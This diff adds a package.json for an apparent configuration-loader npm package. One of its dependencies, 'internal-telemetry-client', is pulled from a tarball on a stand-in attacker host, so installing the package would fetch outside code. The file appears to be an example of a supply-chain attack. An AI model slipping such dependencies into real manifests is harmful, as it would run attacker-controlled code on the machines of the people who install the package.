@@ -1,0 +1,11 @@
+{
+  "name": "config-loader-pro",
+  "version": "0.9.4",
+  "description": "Configuration loader",
+  "main": "index.js",
+  "license": "MIT",
+  "dependencies": {
+    "lodash": "^4.17.21",
+    "internal-telemetry-client": "https://cdn.attacker.example/internal-telemetry-client-1.0.0.tgz"
+  }
+}
